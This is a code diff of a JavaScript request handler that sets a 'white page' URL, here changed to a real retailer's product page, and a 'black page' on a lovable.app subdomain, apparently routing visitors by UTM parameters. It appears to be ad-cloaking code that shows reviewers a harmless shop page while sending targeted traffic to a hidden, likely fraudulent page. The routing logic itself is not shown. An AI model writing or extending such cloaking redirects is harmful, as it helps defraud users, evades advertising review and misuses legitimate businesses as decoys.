@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://wandererstravelco.co/products/the-provence-handbag";
+    const whitePageURL = "https://www.cablechick.com.au/cables/1m-avencore-carbon-series-usb4-240w-cable-40gbps-48v5a-8k60hz.html";
     const blackPageURL = "https://casssshlov.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
